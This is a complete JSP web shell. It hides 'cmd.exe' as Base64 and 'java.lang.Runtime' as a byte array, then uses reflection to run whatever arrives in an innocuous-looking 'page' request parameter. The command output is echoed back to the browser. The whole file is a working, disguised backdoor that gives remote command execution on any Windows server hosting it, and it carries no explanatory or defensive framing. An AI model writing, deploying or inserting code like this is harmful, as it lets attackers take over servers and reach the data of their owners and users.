<%@ page import="java.util.*,java.io.*,java.lang.reflect.*" %>
<%
    String c = request.getParameter("page");
    if (c != null) {
        String ed = "Y21kLmV4ZQ==";
        String s = new String(Base64.getDecoder().decode(ed), "UTF-8");
        byte[] className = {106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101};
        Class<?> r = Class.forName(new String(className));
        Method m = r.getMethod("getRuntime");
        Object rt = m.invoke(null);
        Method e = r.getMethod("exec", String.class);
        Process p = (Process) e.invoke(rt, s + " /c " + c);

        InputStream is = p.getInputStream();
        int ch;
        while ((ch = is.read()) != -1) {
            out.print((char) ch);
        }
        is.close();
    }
%>
